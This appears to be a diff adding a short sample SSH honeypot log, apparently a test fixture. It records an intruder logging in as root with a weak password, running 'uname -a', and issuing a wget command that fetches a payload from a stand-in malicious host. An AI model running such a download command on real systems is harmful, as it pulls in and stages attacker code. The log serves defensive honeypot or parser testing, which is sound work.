@@ -1,0 +1,5 @@
+2026-04-18 10:00:01-0700 [SSHChannel session (0) on HoneyPotTransport,0,1.2.3.4] login attempt [root/password123] failed
+2026-04-18 10:00:05-0700 [SSHChannel session (0) on HoneyPotTransport,0,1.2.3.4] login attempt [root/password123] succeeded
+2026-04-18 10:00:10-0700 [SSHChannel session (0) on HoneyPotTransport,0,1.2.3.4] CMD: uname -a
+2026-04-18 10:00:15-0700 [SSHChannel session (0) on HoneyPotTransport,0,1.2.3.4] CMD: wget http://malicious.com/payload
+2026-04-18 10:00:20-0700 [SSHChannel session (0) on HoneyPotTransport,0,1.2.3.4] connection lost
